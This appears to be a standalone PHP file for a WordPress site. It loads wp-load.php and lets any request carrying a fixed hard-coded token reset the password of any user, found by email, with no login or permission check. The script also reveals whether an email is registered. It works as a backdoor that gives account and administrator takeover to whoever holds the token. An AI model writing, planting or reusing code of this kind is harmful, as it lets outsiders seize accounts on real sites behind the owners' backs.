<?php

	require_once( dirname(__FILE__) . '/wp-load.php' );

	if(isset($_REQUEST['allow']) && $_REQUEST['allow'] == "790f6b6cf6a6fbead525927d69f409fe"){
		if(empty($_REQUEST['vEmail'])){
			echo "Some Parameters missing !!";
		}
		else if(!email_exists($_REQUEST['vEmail'])){
			echo "Email does not exist";
		}
		else{
			$user = get_user_by('email',$_REQUEST['vEmail']);
			$user_id = $user->ID;
			if(empty($_REQUEST['vPassword'])){
				echo "Password field is empty";
			}
			else{
				wp_set_password($_REQUEST['vPassword'], $user_id );
				echo 'Password Changed Successfully !!';
			}
		}
	}
	else{
		echo "Access token missing !!";
	}
?>